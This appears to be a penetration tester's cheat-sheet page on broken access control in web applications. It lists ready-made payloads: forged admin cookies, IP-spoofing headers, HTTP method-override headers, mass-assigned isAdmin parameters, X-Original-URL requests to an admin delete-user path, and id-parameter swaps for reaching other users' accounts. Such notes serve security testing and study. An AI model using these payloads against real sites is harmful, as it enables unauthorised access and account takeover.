---
title: Broken Access Control
desc: 
tags: [Access Control, Burp Suite, Web]
alts: []
render_with_liquid: false
---

## 1. Change Header Values

1. **Cookie**

    You may be able to get access to the login-required pages.

    ```
    Cookie: admin=true
    Cookie: isAdmin=true
    Cookie: access=1
    Cookie: access=true
    ```

2. **IP Spoofing**

    ```
    Cluster-Client-IP: 127.0.0.1
    Forwarded-For: 127.0.0.1
    X-Forwarded: 127.0.0.1
    X-Forwarded-For: 127.0.0.1
    X-Original-URL: 127.0.0.1
    X-Originating-IP: 127.0.0.1
    X-ProxyUser-IP: 127.0.0.1
    X-Remote-Addr: 127.0.0.1
    X-Remote-IP: 127.0.0.1

    Host: 127.0.0.1
    ```

<br />

## 2. Change Methods

```sh
GET, POST, PUT, DELETE, HEAD, TRACE, OPTIONS, PATCH, INVENTED, CONNECT, etc.

# Override to bypass FireWall (via POST /example HTTP/1.1)
X-Method-Override: PUT
X-HTTP-Method-Override: PUT
```

<br />

## 3. Change POST Params

```
POST / HTTP/1.1
...

{
    "email": "new-email@example.com",
    "isAdmin": true
}
```

<br />

## 4. Add X-Original-URL, X-Rewrite-URL

```sh
POST / HTTP/1.1

...
X-Original-URL: /admin/deleteuser
# or
X-Rewrite-URL: /admin/deleteuser
...

username=michael
```

<br />

## 5. Change Query Parameters

```sh
https://vulnerable.com/account?id=michael
https://vulnerable.com/account?id=admin
https://vulnerable.com/account?id=administrator

# GUID cannot be guessed but it may be found somewhere in the website.
https://vulnerable.com/account?id=7230b2a9-60de-4409-a350-cd14986a8d3e
https://vulnerable.com/account?id=1de655cb-29d7-4008-b434-e688b39f9564
```
